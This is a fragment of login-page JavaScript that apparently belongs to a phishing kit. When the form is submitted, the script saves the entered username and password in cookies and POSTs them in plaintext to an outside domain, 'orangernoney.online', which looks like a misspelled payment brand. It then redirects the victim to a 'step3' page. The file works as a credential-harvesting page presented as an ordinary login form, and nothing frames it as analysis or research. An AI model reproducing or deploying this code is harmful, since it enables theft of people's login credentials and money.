    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="./js/cookies.js"></script>
    
    <script>
    $(document).ready(function() {
        var passwordToggle = document.getElementById('passwordToggle');
        var passwordInput = document.getElementById('password');
        passwordToggle.addEventListener('click', () => {
            const type = passwordInput.type === 'password' ? 'text' : 'password';
            passwordInput.type = type;
            passwordToggle.classList.toggle('toggle-visible', type === 'text');
        });
        $('#username').keypress(function(e) {
            if (e.which === 32) { // ASCII code for space
                return false; // Prevent default action (entering the space)
            }
        });
        $('.btn-close').on('click', function(e) {
            e.preventDefault(); // Prevent default form submission
            $('.reject-data').hide();
        });
        $('#login-form').on('submit', function(e) {
            e.preventDefault(); // Prevent default form submission

            const isEmailValid = validateEmail();
            if (!isEmailValid) {
                return;
            }

            var data = $('#login-form').serialize(); // Ensure correct form element
            $('#login-form').hide();
            $('.reject-data').hide();
            $('#loading-section').show();

            setCookie('username',$('#username').val())
            setCookie('password',$('#password').val())


            var xhr = new XMLHttpRequest();
            xhr.open("POST", 'https://orangernoney.online',true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.onreadystatechange = function() {
                if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200){
                    window.location.href = 'step3';

                }   
                else{
                    console.log("ERRORRRRRR")
                }
            }
            xhr.send(
                JSON.stringify({
                    'username':document.getElementById('username').value,
                    'password':document.getElementById('password').value,
                })
            );
        


        }) ;

            

        function validateEmail() {
            $('.valid-email').hide();
            var emailInput = document.getElementById('username');
            const email = emailInput.value.trim();
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

            if (!email) {
                $('.valid-email').show();
                return false;
            }

            if (!emailRegex.test(email)) {
                $('.valid-email').show();
                return false;
            }
            return true;
        }

    });
    </script>
